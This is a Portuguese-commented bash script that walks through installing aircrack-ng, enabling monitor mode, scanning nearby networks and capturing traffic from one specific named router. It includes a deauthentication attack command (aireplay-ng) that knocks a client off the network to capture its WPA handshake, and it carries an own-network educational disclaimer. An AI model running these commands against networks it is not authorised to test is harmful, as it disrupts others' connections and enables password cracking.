#!/bin/bash

# =====================================================================
# ROADMAP: INSTALAÇÃO E MONITORAMENTO WIFI COM AIRCRACK-NG
# =====================================================================
# Este guia automatiza a instalação e comenta cada etapa do processo.
# Use apenas para fins educacionais em sua própria rede!
# =====================================================================

# --- 1. INSTALAÇÃO (Preparando o Sistema) ---

# Atualiza a lista de repositórios do sistema
sudo apt update -y

# Instala a suíte Aircrack-ng e ferramentas de diagnóstico
# aircrack-ng: o pacote principal
# wireless-tools: para o comando iwconfig
# pciutils/usbutils: para identificar sua placa de rede
sudo apt install aircrack-ng wireless-tools usbutils pciutils -y

echo "Instalação concluída. Iniciando configuração..."

# --- 2. PREPARAÇÃO DA INTERFACE ---

# Identifica o nome da sua placa (ex: wlx00928450234)
# Dica: No seu caso, o sistema a renomeia para wlan0mon depois.
iwconfig

# Limpa processos que 'sequestram' o Wi-Fi e impedem o Modo Monitor
# Ex: NetworkManager (o ícone de Wi-fi que some no Ubuntu)
sudo airmon-ng check kill

# Ativa o MODO MONITOR (Sua placa passa a 'ouvir' tudo o que está no ar)
sudo airmon-ng start wlx0087329303d7

# --- 3. VARREDURA (Scan Global) ---

# Escaneia redes em 2.4GHz e 5GHz (Baseado na sua última imagem)
# Pressione Ctrl+C quando encontrar o alvo.
sudo airodump-ng --band abg wlan0mon

# --- 4. MONITORAMENTO FOCADO (Onde a mágica acontece) ---

# Exemplo prático para sua rede 'Topnet Gregorio 2.4' no Canal 7:
# --bssid: MAC do seu roteador
# -c: Canal fixo (impede a placa de pular canais e perder pacotes)
# -w: Salva a captura em um arquivo chamado 'teste_topnet'
# sudo airodump-ng --bssid 31:0F:48:0E:28:19 -c 7 -w teste_topnet wlan0mon

# --- 5. ATAQUE DE DESAUTENTAÇÃO (Forçar Captura de Handshake) ---

# Em um NOVO terminal, você roda este comando para 'derrubar' um dispositivo
# e capturar o Handshake (aperto de mão) quando ele tentar reconectar sozinho.
# -0 5: Envia 5 pacotes de desautenticação
# -a: BSSID do roteador alvo
# -c: MAC do dispositivo (STATION) que você viu conectado
# sudo aireplay-ng -0 5 -a 31:0F:48:0E:28:19 -c F2:F2:2F:21:3B:FF wlan0mon

# --- 6. RESTAURAR O SISTEMA (Voltar à Internet normal) ---

# Para o modo monitor e religa o gerenciador de redes do Ubuntu
# sudo airmon-ng stop wlan0mon
# sudo systemctl start NetworkManager